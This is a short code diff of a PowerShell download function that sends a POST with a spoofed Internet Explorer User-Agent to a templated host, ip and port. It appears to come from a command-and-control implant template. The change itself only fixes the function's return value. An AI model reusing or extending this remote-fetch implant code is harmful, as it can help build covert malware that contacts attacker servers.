@@ -26,8 +26,9 @@ function dn($filename){
            $wc3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
            $wc3.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
            $re=$wc3.UploadString("{HTTP}://{ip}:{port}{download}","POST",$postParams)
+           $output=$re
              }
 
 
-      return $output.Content
+      return $output
       }
